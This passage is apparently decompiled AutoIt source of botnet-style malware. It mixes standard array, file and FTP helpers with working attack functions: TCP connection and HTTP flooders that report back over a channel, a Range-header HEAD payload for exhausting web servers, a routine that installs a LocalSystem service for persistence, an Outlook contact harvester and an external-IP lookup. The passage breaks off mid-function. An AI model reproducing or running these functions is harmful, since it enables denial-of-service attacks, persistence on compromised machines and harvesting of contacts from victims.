        Case $arrayfill_force_number
            $hdatatype = NUMBER
        Case $arrayfill_force_ptr
            $hdatatype = PTR
        Case $arrayfill_force_hwnd
            $hdatatype = HWND
        Case $arrayfill_force_string
            $hdatatype = STRING
    EndSwitch
    Local $asplit_1, $asplit_2
    If IsArray($vrange) Then
        If UBound($vrange, $ubound_dimensions) <> 0x1 Or UBound($vrange, $ubound_rows) < 0x2 Then Return SetError(0x4, 0x0, +0xffffffff)
    Else
        Local $inumber
        $vrange = StringStripWS($vrange, 0x8)
        $asplit_1 = StringSplit($vrange, ";")
        $vrange = ""
        For $i = 0x1 To $asplit_1[0x0]
            If Not StringRegExp($asplit_1[$i], "^\d+(-\d+)?$") Then Return SetError(0x3, 0x0, +0xffffffff)
            $asplit_2 = StringSplit($asplit_1[$i], "-")
            Switch $asplit_2[0x0]
                Case 0x1
                    $vrange &= $asplit_2[0x1] & ";"
                Case 0x2
                    If Number($asplit_2[0x2]) >= Number($asplit_2[0x1]) Then
                        $inumber = $asplit_2[0x1] + 0xffffffff
                        Do
                            $inumber += 0x1
                            $vrange &= $inumber & ";"
                        Until $inumber = $asplit_2[0x2]
                    EndIf
            EndSwitch
        Next
        $vrange = StringSplit(StringTrimRight($vrange, 0x1), ";")
    EndIf
    If $vrange[0x1] < 0x0 Or $vrange[$vrange[0x0]] > $idim_1 Then Return SetError(0x5, 0x0, +0xffffffff)
    For $i = 0x2 To $vrange[0x0]
        If $vrange[$i] < $vrange[$i + 0xffffffff] Then Return SetError(0x3, 0x0, +0xffffffff)
    Next
    Local $icopyto_index = $idim_1 + $vrange[0x0]
    Local $iinsertpoint_index = $vrange[0x0]
    Local $iinsert_index = $vrange[$iinsertpoint_index]
    Switch UBound($aarray, $ubound_dimensions)
        Case 0x1
            If $iforce = $arrayfill_force_singleitem Then
                ReDim $aarray[$idim_1 + $vrange[0x0] + 0x1]
                For $ireadfromindex = $idim_1 To 0x0 Step +0xffffffff
                    $aarray[$icopyto_index] = $aarray[$ireadfromindex]
                    $icopyto_index -= 0x1
                    $iinsert_index = $vrange[$iinsertpoint_index]
                    While $ireadfromindex = $iinsert_index
                        $aarray[$icopyto_index] = $vvalue
                        $icopyto_index -= 0x1
                        $iinsertpoint_index -= 0x1
                        If $iinsertpoint_index < 0x1 Then ExitLoop 0x2
                        $iinsert_index = $vrange[$iinsertpoint_index]
                    WEnd
                Next
                Return $idim_1 + $vrange[0x0] + 0x1
            EndIf
            ReDim $aarray[$idim_1 + $vrange[0x0] + 0x1]
            If IsArray($vvalue) Then
                If UBound($vvalue, $ubound_dimensions) <> 0x1 Then Return SetError(0x5, 0x0, +0xffffffff)
                $hdatatype = 0x0
            Else
                Local $atmp = StringSplit($vvalue, $sdelim_item, $str_nocount + $str_entiresplit)
                If UBound($atmp, $ubound_rows) = 0x1 Then
                    $atmp[0x0] = $vvalue
                    $hdatatype = 0x0
                EndIf
                $vvalue = $atmp
            EndIf
            For $ireadfromindex = $idim_1 To 0x0 Step +0xffffffff
                $aarray[$icopyto_index] = $aarray[$ireadfromindex]
                $icopyto_index -= 0x1
                $iinsert_index = $vrange[$iinsertpoint_index]
                While $ireadfromindex = $iinsert_index
                    If $iinsertpoint_index <= UBound($vvalue, $ubound_rows) Then
                        If ISFUNC($hdatatype) Then
                            $aarray[$icopyto_index] = $HDATATYPE($vvalue[$iinsertpoint_index + 0xffffffff])
                        Else
                            $aarray[$icopyto_index] = $vvalue[$iinsertpoint_index + 0xffffffff]
                        EndIf
                    Else
                        $aarray[$icopyto_index] = ""
                    EndIf
                    $icopyto_index -= 0x1
                    $iinsertpoint_index -= 0x1
                    If $iinsertpoint_index = 0x0 Then ExitLoop 0x2
                    $iinsert_index = $vrange[$iinsertpoint_index]
                WEnd
            Next
        Case 0x2
            Local $idim_2 = UBound($aarray, $ubound_columns)
            If $istart < 0x0 Or $istart > $idim_2 + 0xffffffff Then Return SetError(0x6, 0x0, +0xffffffff)
            Local $ivaldim_1, $ivaldim_2
            If IsArray($vvalue) Then
                If UBound($vvalue, $ubound_dimensions) <> 0x2 Then Return SetError(0x7, 0x0, +0xffffffff)
                $ivaldim_1 = UBound($vvalue, $ubound_rows)
                $ivaldim_2 = UBound($vvalue, $ubound_columns)
                $hdatatype = 0x0
            Else
                $asplit_1 = StringSplit($vvalue, $sdelim_row, $str_nocount + $str_entiresplit)
                $ivaldim_1 = UBound($asplit_1, $ubound_rows)
                StringReplace($asplit_1[0x0], $sdelim_item, "")
                $ivaldim_2 = @extended + 0x1
                Local $atmp[$ivaldim_1][$ivaldim_2]
                For $i = 0x0 To $ivaldim_1 + 0xffffffff
                    $asplit_2 = StringSplit($asplit_1[$i], $sdelim_item, $str_nocount + $str_entiresplit)
                    For $j = 0x0 To $ivaldim_2 + 0xffffffff
                        $atmp[$i][$j] = $asplit_2[$j]
                    Next
                Next
                $vvalue = $atmp
            EndIf
            If UBound($vvalue, $ubound_columns) + $istart > UBound($aarray, $ubound_columns) Then Return SetError(0x8, 0x0, +0xffffffff)
            ReDim $aarray[$idim_1 + $vrange[0x0] + 0x1][$idim_2]
            For $ireadfromindex = $idim_1 To 0x0 Step +0xffffffff
                For $j = 0x0 To $idim_2 + 0xffffffff
                    $aarray[$icopyto_index][$j] = $aarray[$ireadfromindex][$j]
                Next
                $icopyto_index -= 0x1
                $iinsert_index = $vrange[$iinsertpoint_index]
                While $ireadfromindex = $iinsert_index
                    For $j = 0x0 To $idim_2 + 0xffffffff
                        If $j < $istart Then
                            $aarray[$icopyto_index][$j] = ""
                        ElseIf $j - $istart > $ivaldim_2 + 0xffffffff Then
                            $aarray[$icopyto_index][$j] = ""
                        Else
                            If $iinsertpoint_index + 0xffffffff < $ivaldim_1 Then
                                If ISFUNC($hdatatype) Then
                                    $aarray[$icopyto_index][$j] = $HDATATYPE($vvalue[$iinsertpoint_index + 0xffffffff][$j - $istart])
                                Else
                                    $aarray[$icopyto_index][$j] = $vvalue[$iinsertpoint_index + 0xffffffff][$j - $istart]
                                EndIf
                            Else
                                $aarray[$icopyto_index][$j] = ""
                            EndIf
                        EndIf
                    Next
                    $icopyto_index -= 0x1
                    $iinsertpoint_index -= 0x1
                    If $iinsertpoint_index = 0x0 Then ExitLoop 0x2
                    $iinsert_index = $vrange[$iinsertpoint_index]
                WEnd
            Next
        Case Else
            Return SetError(0x2, 0x0, +0xffffffff)
    EndSwitch
    Return UBound($aarray, $ubound_rows)
EndFunc   ;==>_ARRAYINSERT
Func _ArraySearch(Const ByRef $aarray, $vvalue, $istart = 0x0, $iend = 0x0, $icase = 0x0, $icompare = 0x0, $iforward = 0x1, $isubitem = +0xffffffff, $brow = False)
    If $istart = Default Then $istart = 0x0
    If $iend = Default Then $iend = 0x0
    If $icase = Default Then $icase = 0x0
    If $icompare = Default Then $icompare = 0x0
    If $iforward = Default Then $iforward = 0x1
    If $isubitem = Default Then $isubitem = +0xffffffff
    If $brow = Default Then $brow = False
    If Not IsArray($aarray) Then Return SetError(0x1, 0x0, +0xffffffff)
    Local $idim_1 = UBound($aarray) + 0xffffffff
    If $idim_1 = +0xffffffff Then Return SetError(0x3, 0x0, +0xffffffff)
    Local $idim_2 = UBound($aarray, $ubound_columns) + 0xffffffff
    Local $bcomptype = False
    If $icompare = 0x2 Then
        $icompare = 0x0
        $bcomptype = True
    EndIf
    If $brow Then
        If UBound($aarray, $ubound_dimensions) = 0x1 Then Return SetError(0x5, 0x0, +0xffffffff)
        If $iend < 0x1 Or $iend > $idim_2 Then $iend = $idim_2
        If $istart < 0x0 Then $istart = 0x0
        If $istart > $iend Then Return SetError(0x4, 0x0, +0xffffffff)
    Else
        If $iend < 0x1 Or $iend > $idim_1 Then $iend = $idim_1
        If $istart < 0x0 Then $istart = 0x0
        If $istart > $iend Then Return SetError(0x4, 0x0, +0xffffffff)
    EndIf
    Local $istep = 0x1
    If Not $iforward Then
        Local $itmp = $istart
        $istart = $iend
        $iend = $itmp
        $istep = +0xffffffff
    EndIf
    Switch UBound($aarray, $ubound_dimensions)
        Case 0x1
            If Not $icompare Then
                If Not $icase Then
                    For $i = $istart To $iend Step $istep
                        If $bcomptype And VarGetType($aarray[$i]) <> VarGetType($vvalue) Then ContinueLoop
                        If $aarray[$i] = $vvalue Then Return $i
                    Next
                Else
                    For $i = $istart To $iend Step $istep
                        If $bcomptype And VarGetType($aarray[$i]) <> VarGetType($vvalue) Then ContinueLoop
                        If $aarray[$i] == $vvalue Then Return $i
                    Next
                EndIf
            Else
                For $i = $istart To $iend Step $istep
                    If $icompare = 0x3 Then
                        If StringRegExp($aarray[$i], $vvalue) Then Return $i
                    Else
                        If StringInStr($aarray[$i], $vvalue, $icase) > 0x0 Then Return $i
                    EndIf
                Next
            EndIf
        Case 0x2
            Local $idim_sub
            If $brow Then
                $idim_sub = $idim_1
                If $isubitem > $idim_sub Then $isubitem = $idim_sub
                If $isubitem < 0x0 Then
                    $isubitem = 0x0
                Else
                    $idim_sub = $isubitem
                EndIf
            Else
                $idim_sub = $idim_2
                If $isubitem > $idim_sub Then $isubitem = $idim_sub
                If $isubitem < 0x0 Then
                    $isubitem = 0x0
                Else
                    $idim_sub = $isubitem
                EndIf
            EndIf
            For $j = $isubitem To $idim_sub
                If Not $icompare Then
                    If Not $icase Then
                        For $i = $istart To $iend Step $istep
                            If $brow Then
                                If $bcomptype And VarGetType($aarray[$j][$i]) <> VarGetType($vvalue) Then ContinueLoop
                                If $aarray[$j][$i] = $vvalue Then Return $i
                            Else
                                If $bcomptype And VarGetType($aarray[$i][$j]) <> VarGetType($vvalue) Then ContinueLoop
                                If $aarray[$i][$j] = $vvalue Then Return $i
                            EndIf
                        Next
                    Else
                        For $i = $istart To $iend Step $istep
                            If $brow Then
                                If $bcomptype And VarGetType($aarray[$j][$i]) <> VarGetType($vvalue) Then ContinueLoop
                                If $aarray[$j][$i] == $vvalue Then Return $i
                            Else
                                If $bcomptype And VarGetType($aarray[$i][$j]) <> VarGetType($vvalue) Then ContinueLoop
                                If $aarray[$i][$j] == $vvalue Then Return $i
                            EndIf
                        Next
                    EndIf
                Else
                    For $i = $istart To $iend Step $istep
                        If $icompare = 0x3 Then
                            If $brow Then
                                If StringRegExp($aarray[$j][$i], $vvalue) Then Return $i
                            Else
                                If StringRegExp($aarray[$i][$j], $vvalue) Then Return $i
                            EndIf
                        Else
                            If $brow Then
                                If StringInStr($aarray[$j][$i], $vvalue, $icase) > 0x0 Then Return $i
                            Else
                                If StringInStr($aarray[$i][$j], $vvalue, $icase) > 0x0 Then Return $i
                            EndIf
                        EndIf
                    Next
                EndIf
            Next
        Case Else
            Return SetError(0x2, 0x0, +0xffffffff)
    EndSwitch
    Return SetError(0x6, 0x0, +0xffffffff)
EndFunc   ;==>_ARRAYSEARCH
Func _ArrayToString(Const ByRef $aarray, $sdelim_col = "|", $istart_row = +0xffffffff, $iend_row = +0xffffffff, $sdelim_row = @CRLF, $istart_col = +0xffffffff, $iend_col = +0xffffffff)
    If $sdelim_col = Default Then $sdelim_col = "|"
    If $sdelim_row = Default Then $sdelim_row = @CRLF
    If $istart_row = Default Then $istart_row = +0xffffffff
    If $iend_row = Default Then $iend_row = +0xffffffff
    If $istart_col = Default Then $istart_col = +0xffffffff
    If $iend_col = Default Then $iend_col = +0xffffffff
    If Not IsArray($aarray) Then Return SetError(0x1, 0x0, +0xffffffff)
    Local $idim_1 = UBound($aarray, $ubound_rows) + 0xffffffff
    If $istart_row = +0xffffffff Then $istart_row = 0x0
    If $iend_row = +0xffffffff Then $iend_row = $idim_1
    If $istart_row < +0xffffffff Or $iend_row < +0xffffffff Then Return SetError(0x3, 0x0, +0xffffffff)
    If $istart_row > $idim_1 Or $iend_row > $idim_1 Then Return SetError(0x3, 0x0, "")
    If $istart_row > $iend_row Then Return SetError(0x4, 0x0, +0xffffffff)
    Local $sret = ""
    Switch UBound($aarray, $ubound_dimensions)
        Case 0x1
            For $i = $istart_row To $iend_row
                $sret &= $aarray[$i] & $sdelim_col
            Next
            Return StringTrimRight($sret, StringLen($sdelim_col))
        Case 0x2
            Local $idim_2 = UBound($aarray, $ubound_columns) + 0xffffffff
            If $istart_col = +0xffffffff Then $istart_col = 0x0
            If $iend_col = +0xffffffff Then $iend_col = $idim_2
            If $istart_col < +0xffffffff Or $iend_col < +0xffffffff Then Return SetError(0x5, 0x0, +0xffffffff)
            If $istart_col > $idim_2 Or $iend_col > $idim_2 Then Return SetError(0x5, 0x0, +0xffffffff)
            If $istart_col > $iend_col Then Return SetError(0x6, 0x0, +0xffffffff)
            For $i = $istart_row To $iend_row
                For $j = $istart_col To $iend_col
                    $sret &= $aarray[$i][$j] & $sdelim_col
                Next
                $sret = StringTrimRight($sret, StringLen($sdelim_col)) & $sdelim_row
            Next
            Return StringTrimRight($sret, StringLen($sdelim_row))
        Case Else
            Return SetError(0x2, 0x0, +0xffffffff)
    EndSwitch
    Return 0x1
EndFunc   ;==>_ARRAYTOSTRING
Func _ArrayUnique(Const ByRef $aarray, $icolumn = 0x0, $ibase = 0x0, $icase = 0x0, $icount = $arrayunique_count, $iinttype = $arrayunique_auto)
    If $icolumn = Default Then $icolumn = 0x0
    If $ibase = Default Then $ibase = 0x0
    If $icase = Default Then $icase = 0x0
    If $icount = Default Then $icount = $arrayunique_count
    If UBound($aarray, $ubound_rows) = 0x0 Then Return SetError(0x1, 0x0, 0x0)
    Local $idims = UBound($aarray, $ubound_dimensions), $inumcolumns = UBound($aarray, $ubound_columns)
    If $idims > 0x2 Then Return SetError(0x2, 0x0, 0x0)
    If $ibase < 0x0 Or $ibase > 0x1 Or (Not IsInt($ibase)) Then Return SetError(0x3, 0x0, 0x0)
    If $icase < 0x0 Or $icase > 0x1 Or (Not IsInt($icase)) Then Return SetError(0x3, 0x0, 0x0)
    If $icount < 0x0 Or $icount > 0x1 Or (Not IsInt($icount)) Then Return SetError(0x4, 0x0, 0x0)
    If $iinttype < 0x0 Or $iinttype > 0x4 Or (Not IsInt($iinttype)) Then Return SetError(0x5, 0x0, 0x0)
    If $icolumn < 0x0 Or ($inumcolumns = 0x0 And $icolumn > 0x0) Or ($inumcolumns > 0x0 And $icolumn >= $inumcolumns) Then Return SetError(0x6, 0x0, 0x0)
    If $iinttype = $arrayunique_auto Then
        Local $bint, $svartype
        If $idims = 0x1 Then
            $bint = IsInt($aarray[$ibase])
            $svartype = VarGetType($aarray[$ibase])
        Else
            $bint = IsInt($aarray[$ibase][$icolumn])
            $svartype = VarGetType($aarray[$ibase][$icolumn])
        EndIf
        If $bint And $svartype = "Int64" Then
            $iinttype = $arrayunique_force64
        Else
            $iinttype = $arrayunique_force32
        EndIf
    EndIf
    Local $odictionary = ObjCreate("Scripting.Dictionary")
    $odictionary .CompareMode = Number(Not $icase)
    Local $velem, $stype, $vkey, $bcomerror = False
    For $i = $ibase To UBound($aarray) + 0xffffffff
        If $idims = 0x1 Then
            $velem = $aarray[$i]
        Else
            $velem = $aarray[$i][$icolumn]
        EndIf
        Switch $iinttype
            Case $arrayunique_force32
                $odictionary .Item($velem)
                If @error Then
                    $bcomerror = True
                    ExitLoop
                EndIf
            Case $arrayunique_force64
                $stype = VarGetType($velem)
                If $stype = "Int32" Then
                    $bcomerror = True
                    ExitLoop
                EndIf
                $vkey = "#" & $stype & "#" & String($velem)
                If Not $odictionary .Item($vkey) Then
                    $ODICTIONARY($vkey) = $velem
                EndIf
            Case $arrayunique_match
                $stype = VarGetType($velem)
                If StringLeft($stype, 0x3) = "Int" Then
                    $vkey = "#Int#" & String($velem)
                Else
                    $vkey = "#" & $stype & "#" & String($velem)
                EndIf
                If Not $odictionary .Item($vkey) Then
                    $ODICTIONARY($vkey) = $velem
                EndIf
            Case $arrayunique_distinct
                $vkey = "#" & VarGetType($velem) & "#" & String($velem)
                If Not $odictionary .Item($vkey) Then
                    $ODICTIONARY($vkey) = $velem
                EndIf
        EndSwitch
    Next
    Local $avalues, $j = 0x0
    If $bcomerror Then
        Return SetError(0x7, 0x0, 0x0)
    ElseIf $iinttype <> $arrayunique_force32 Then
        Local $avalues[$odictionary .Count]
        For $vkey In $odictionary .Keys()
            $avalues[$j] = $ODICTIONARY($vkey)
            If StringLeft($vkey, 0x5) = "#Ptr#" Then
                $avalues[$j] = Ptr($avalues[$j])
            EndIf
            $j += 0x1
        Next
    Else
        $avalues = $odictionary .Keys()
    EndIf
    If $icount Then
        _ArrayInsert($avalues, 0x0, $odictionary .Count)
    EndIf
    Return $avalues
EndFunc   ;==>_ARRAYUNIQUE
Func _BINARYTOINT16($4bytes)
    $dllstruct2_integer = DllStructCreate("int")
    $dllstruct2_binary = DllStructCreate("byte[4]", DllStructGetPtr($dllstruct2_integer))
    DllStructSetData($dllstruct2_binary, 0x1, $4bytes)
    Return DllStructGetData($dllstruct2_integer, 0x1)
EndFunc   ;==>_BINARYTOINT16
Func _CONDISFLOOD($host, $port, $time)
    $ip = TCPNameToIP($host)
    $port = Int($port)
    $time = Int($time)
    TCPStartup()
    Local $timer = TimerInit(), $diff = 0x0
    While 0x1
        $diff = TimerDiff($timer)
        If $diff >= $time * 0x3e8 Then
            ExitLoop
        EndIf
        $socket = TCPConnect($ip, $port)
        TCPCloseSocket($socket)
    WEnd
EndFunc   ;==>_CONDISFLOOD
Func _CREATESERVICE($scomputername, $sservicename, $sdisplayname, $sbinarypath, $sserviceuser = "LocalSystem", $spassword = "", $nservicetype = 0x10, $nstarttype = 0x2, $nerrortype = 0x1, $ndesiredaccess = 0xf01ff, $sloadordergroup = "")
    Local $hadvapi32
    Local $hkernel32
    Local $arret
    Local $hsc
    Local $lerror = +0xffffffff
    $hadvapi32 = DllOpen("advapi32.dll")
    If $hadvapi32 = +0xffffffff Then Return 0x0
    $hkernel32 = DllOpen("kernel32.dll")
    If $hkernel32 = +0xffffffff Then Return 0x0
    $arret = DllCall($hadvapi32, "long", "OpenSCManager", "str", $scomputername, "str", "ServicesActive", "long", $sc_manager_all_access)
    If $arret[0x0] = 0x0 Then
        $arret = DllCall($hkernel32, "long", "GetLastError")
        $lerror = $arret[0x0]
    Else
        $hsc = $arret[0x0]
        $arret = DllCall($hadvapi32, "long", "OpenService", "long", $hsc, "str", $sservicename, "long", $service_interrogate)
        If $arret[0x0] = 0x0 Then
            $arret = DllCall($hadvapi32, "long", "CreateService", "long", $hsc, "str", $sservicename, "str", $sdisplayname, "long", $ndesiredaccess, "long", $nservicetype, "long", $nstarttype, "long", $nerrortype, "str", $sbinarypath, "str", $sloadordergroup, "ptr", 0x0, "str", "", "str", $sserviceuser, "str", $spassword)
            If $arret[0x0] = 0x0 Then
                $arret = DllCall($hkernel32, "long", "GetLastError")
                $lerror = $arret[0x0]
            Else
                DllCall($hadvapi32, "int", "CloseServiceHandle", "long", $arret[0x0])
            EndIf
        Else
            DllCall($hadvapi32, "int", "CloseServiceHandle", "long", $arret[0x0])
        EndIf
        DllCall($hadvapi32, "int", "CloseServiceHandle", "long", $hsc)
    EndIf
    DllClose($hadvapi32)
    DllClose($hkernel32)
    If $lerror <> +0xffffffff Then
        SetError($lerror)
        Return 0x0
    EndIf
    Return 0x1
EndFunc   ;==>_CREATESERVICE
Func _ELEMENTEXISTS($array, $element)
    If $element > UBound($array) + 0xffffffff Then Return False
    Return True
EndFunc   ;==>_ELEMENTEXISTS
Func _FileCountLines($sfilepath)
    FILEREADTOARRAY($sfilepath)
    If @error Then Return SetError(@error, @extended, 0x0)
    Return @extended
EndFunc   ;==>_FILECOUNTLINES
Func _FileListToArray($spath, $sfilter = "*", $iflag = 0x0)
    Local $hsearch, $sfile, $sfilelist, $asfilelist[0x1]
    If Not FileExists($spath) Then Return SetError(0x1, 0x1, "")
    If StringRegExp($sfilter, "[\\/:<>|]") Or (Not StringStripWS($sfilter, 0x8)) Then Return SetError(0x2, 0x2, "")
    If Not ($iflag = 0x0 Or $iflag = 0x1 Or $iflag = 0x2 Or $iflag = 0x4 Or $iflag = 0x5 Or $iflag = 0x6) Then Return SetError(0x3, 0x3, "")
    If (StringMid($spath, StringLen($spath), 0x1) = "\") Then $spath = StringTrimRight($spath, 0x1)
    $hsearch = FileFindFirstFile($spath & "\" & $sfilter)
    If $hsearch = +0xffffffff Then Return SetError(0x4, 0x4, "")
    While 0x1
        $sfile = FileFindNextFile($hsearch)
        If @error Then
            SetError(0x0)
            ExitLoop
        EndIf
        If $iflag = 0x1 And StringInStr(FileGetAttrib($spath & "\" & $sfile), "D") <> 0x0 Then ContinueLoop
        If $iflag = 0x2 And StringInStr(FileGetAttrib($spath & "\" & $sfile), "D") = 0x0 Then ContinueLoop
        If $iflag > 0x3 Then $sfile = $spath & "\" & $sfile
        $sfilelist &= $sfile & "|"
    WEnd
    FileClose($hsearch)
    $asfilelist = StringSplit(StringTrimRight($sfilelist, 0x1), "|")
    Return $asfilelist
EndFunc   ;==>_FILELISTTOARRAY
Func _FTP_Close($l_internetsession)
    If $__ghwininet_ftp = +0xffffffff Then Return SetError(+0xfffffffe, 0x0, 0x0)
    Local $ai_internetclosehandle = DllCall($__ghwininet_ftp, "bool", "InternetCloseHandle", "handle", $l_internetsession)
    If @error Or $ai_internetclosehandle[0x0] = 0x0 Then Return SetError(+0xffffffff, 0x1, 0x0)
    If $__gbcallback_set = True Then DllCallbackFree($__ghcallback_ftp)
    Return $ai_internetclosehandle[0x0]
EndFunc   ;==>_FTP_CLOSE
Func _FTP_Connect($l_internetsession, $s_servername, $s_username, $s_password, $i_passive = 0x0, $i_serverport = 0x0, $l_service = $internet_service_ftp, $l_flags = 0x0, $l_context = 0x0)
    If $__ghwininet_ftp = +0xffffffff Then Return SetError(+0xfffffffe, 0x0, 0x0)
    If $i_passive == 0x1 Then $l_flags = BitOR($l_flags, $internet_flag_passive)
    Local $ai_internetconnect = DllCall($__ghwininet_ftp, "hwnd", "InternetConnectW", "handle", $l_internetsession, "wstr", $s_servername, "ushort", $i_serverport, "wstr", $s_username, "wstr", $s_password, "dword", $l_service, "dword", $l_flags, "dword_ptr", $l_context)
    If @error Or $ai_internetconnect[0x0] = 0x0 Then Return SetError(+0xffffffff, 0x1, 0x0)
    Return $ai_internetconnect[0x0]
EndFunc   ;==>_FTP_CONNECT
Func _FTP_Open($s_agent, $l_accesstype = $internet_open_type_direct, $s_proxyname = "", $s_proxybypass = "", $l_flags = 0x0)
    If $__ghwininet_ftp = +0xffffffff Then __FTP_INIT()
    Local $ai_internetopen = DllCall($__ghwininet_ftp, "handle", "InternetOpenW", "wstr", $s_agent, "dword", $l_accesstype, "wstr", $s_proxyname, "wstr", $s_proxybypass, "dword", $l_flags)
    If @error Or $ai_internetopen[0x0] = 0x0 Then Return SetError(+0xffffffff, 0x1, 0x0)
    Return $ai_internetopen[0x0]
EndFunc   ;==>_FTP_OPEN
Func _FTP_ProgressUpload($l_ftpsession, $s_localfile, $s_remotefile, $functiontocall = "")
    If $__ghwininet_ftp = +0xffffffff Then Return SetError(+0xfffffffe, 0x0, 0x0)
    Local $fhandle = FileOpen($s_localfile, 0x10)
    If @error Then Return SetError(+0xffffffff, 0x1, 0x0)
    Local $ai_ftpopenfile = DllCall($__ghwininet_ftp, "handle", "FtpOpenFileW", "handle", $l_ftpsession, "wstr", $s_remotefile, "dword", $generic_write, "dword", $ftp_transfer_type_binary, "dword_ptr", 0x0)
    If @error Or $ai_ftpopenfile[0x0] = 0x0 Then Return SetError(+0xfffffffd, 0x1, 0x0)
    Local $glen = FileGetSize($s_localfile)
    Local Const $chunksize = 0x100 * 0x400
    Local $last = Mod($glen, $chunksize)
    Local $parts = Ceiling($glen / $chunksize)
    Local $buffer = DllStructCreate("byte[" & $chunksize & "]")
    Local $ai_internetclosehandle, $ai_ftpwrite, $out, $ret, $lasterror
    Local $x = $chunksize
    Local $done = 0x0
    For $i = 0x1 To $parts
        If $i = $parts And $last > 0x0 Then
            $x = $last
        EndIf
        DllStructSetData($buffer, 0x1, FileRead($fhandle, $x))
        $ai_ftpwrite = DllCall($__ghwininet_ftp, "bool", "InternetWriteFile", "handle", $ai_ftpopenfile[0x0], "struct*", $buffer, "dword", $x, "dword*", $out)
        If @error Or $ai_ftpwrite[0x0] = 0x0 Then
            $lasterror = 0x1
            $ai_internetclosehandle = DllCall($__ghwininet_ftp, "bool", "InternetCloseHandle", "handle", $ai_ftpopenfile[0x0])
            FileClose($fhandle)
            Return SetError(+0xfffffffc, $lasterror, 0x0)
        EndIf
        $done += $x
        If $functiontocall = "" Then
            ProgressSet(($done / $glen) * 0x64)
        Else
            If $ret <= 0x0 Then
                $lasterror = @error
                $ai_internetclosehandle = DllCall($__ghwininet_ftp, "bool", "InternetCloseHandle", "handle", $ai_ftpopenfile[0x0])
                DllCall($__ghwininet_ftp, "bool", "FtpDeleteFileW", "handle", $l_ftpsession, "wstr", $s_remotefile)
                FileClose($fhandle)
                Return SetError(+0xfffffffa, $lasterror, $ret)
            EndIf
        EndIf
        Sleep(0xa)
    Next
    FileClose($fhandle)
    If $functiontocall = "" Then ProgressOff()
    $ai_internetclosehandle = DllCall($__ghwininet_ftp, "bool", "InternetCloseHandle", "handle", $ai_ftpopenfile[0x0])
    If @error Or $ai_internetclosehandle[0x0] = 0x0 Then Return SetError(+0xfffffffb, 0x1, 0x0)
    Return 0x1
EndFunc   ;==>_FTP_PROGRESSUPLOAD
Func _GetIP()
    Local Const $str_regexparrayglobalmatch = 0x3
    Local Const $getip_timer = 0x493e0
    Local Static $htimer = 0x0
    Local Static $slastip = 0x0
    If TimerDiff($htimer) < $getip_timer And Not $slastip Then
        Return SetExtended(0x1, $slastip)
    EndIf
    Local $agetipurl = ["https://api.ipify.org", "http://checkip.dyndns.org", "http://www.myexternalip.com/raw", "http://bot.whatismyipaddress.com"], $areturn = 0x0, $sreturn = ""
    For $i = 0x0 To UBound($agetipurl) + 0xffffffff
        $areturn = ""
        Local $sreturn = InetRead($agetipurl[$i])
        If @error Or $sreturn == "" Then
            ContinueLoop
        EndIf
        $areturn = StringRegExp(BinaryToString($sreturn), "((?:\d{1,3}\.){3}\d{1,3})", $str_regexparrayglobalmatch)
        If Not @error Then
            $sreturn = $areturn[0x0]
            ExitLoop
        EndIf
        $sreturn = ""
    Next
    $htimer = TimerInit()
    $slastip = $sreturn
    If $sreturn == "" Then Return SetError(0x1, 0x0, +0xffffffff)
    Return $sreturn
EndFunc   ;==>_GETIP
Func _HTTPARME($host, $page, $socket = +0xffffffff)
    Dim $command
    $command = "HEAD / HTTP/1.1" & @CRLF
    $command &= "Host: " & $host & @CRLF
    $command &= "Range:bytes=0-,"
    For $i = 0x0 To 0x514 Step 0x1
        $command &= "1-" & $i & ","
    Next
    $command &= @CRLF
    $command &= "Accept-Encoding: gzip" & @CRLF
    $command &= "User-Agent: " & $useragents[Random(0x0, 0x23, 0x1)] & @CRLF
    $command &= "Connection: close" & @CRLF
    $command &= @CRLF
    Dim $bytessent = TCPSend($socket, $command)
    If $bytessent == 0x0 Then
        SetExtended(@error)
        SetError(0x2)
        Return 0x0
    EndIf
    SetError(0x0)
    Return $bytessent
EndFunc   ;==>_HTTPARME
Func _HTTPFLOOD($host, $port, $path, $time)
    $ip = TCPNameToIP($host)
    $port = Int($port)
    $time = Int($time)
    TCPStartup()
    Local $timer = TimerInit(), $diff = 0x0
    While 0x1
        $diff = TimerDiff($timer)
        If $diff >= ($time * 0x3e8) Then
            ExitLoop
        EndIf
        $httpsock = TCPConnect($ip, $port)
        While Not @error
            $sent = _HTTPGET($host, $path, $httpsock)
            If $diff >= $time * 0x3e8 Then
                ExitLoop
            EndIf
        WEnd
        TCPCloseSocket($httpsock)
    WEnd
	SENDMESSAGE($sock, "HTTP flood finished", $channel)
EndFunc   ;==>_HTTPFLOOD
Func _HTTPGET($host, $page, $socket = +0xffffffff)
    Dim $command
    $command = "GET " & $page & " HTTP/1.1" & @CRLF
    $command &= "Host: " & $host & @CRLF
    $command &= "User-Agent: " & $useragents[Random(0x0, 0x23, 0x1)] & @CRLF
    $command &= "Connection: keep-alive" & @CRLF
    $command &= @CRLF
    Dim $bytessent = TCPSend($socket, $command)
    If $bytessent == 0x0 Then
        SetExtended(@error)
        SetError(0x2)
        Return 0x0
    EndIf
    SetError(0x0)
    Return $bytessent
EndFunc   ;==>_HTTPGET
Func _MSSQL_CON($scip, $scuser, $scpass, $scdb)
    Local $sqlcon
    $sqlcon = ObjCreate("ADODB.Connection")
    $sqlcon .Open("Provider=SQLOLEDB; Data Source=" & $scip & "; User ID=" & $scuser & "; Password=" & $scpass & "; database=" & $scdb & ";")
    Return $sqlcon
EndFunc   ;==>_MSSQL_CON
Func _MSSQL_END($sqlcon)
    If IsObj($sqlcon) Then
        $sqlcon .close
    EndIf
EndFunc   ;==>_MSSQL_END
Func _MSSQL_QUERY($isqlcon, $iquery)
    If IsObj($isqlcon) Then
        Return $isqlcon .execute($iquery)
    EndIf
EndFunc   ;==>_MSSQL_QUERY
Func _OUTLOOKGETCONTACTS($ooutlook, $sfirstname = "", $slastname = "", $semail1adress = "", $fsearchpart = False, $ffulllist = False, $swarningclick = "")
    If $swarningclick <> "" And FileExists($swarningclick) = 0x0 Then
        Return SetError(0x2, 0x0, 0x0)
    Else
        Run(@ComSpec & " /C " & $swarningclick, "", @SW_HIDE)
    EndIf
    Local $irc = 0x0, $iarraysize
    Local $oouerror = ObjEvent("AutoIt.Error", "_OutlookError")
    Local $onamespace = $ooutlook .getnamespace("MAPI")
    Local $ofolder = $onamespace .getdefaultfolder(0xa)
    Local $ocolitems = $ofolder .items
    Local $inumofcontacts = $ocolitems .count
    Local $ascontacts[$inumofcontacts], $stemp
    For $inum = 0x1 To $inumofcontacts
        If $ocolitems .item($inum).class <> 0x28 Then ContinueLoop
        If $sfirstname <> "" Then
            If $fsearchpart = False Then
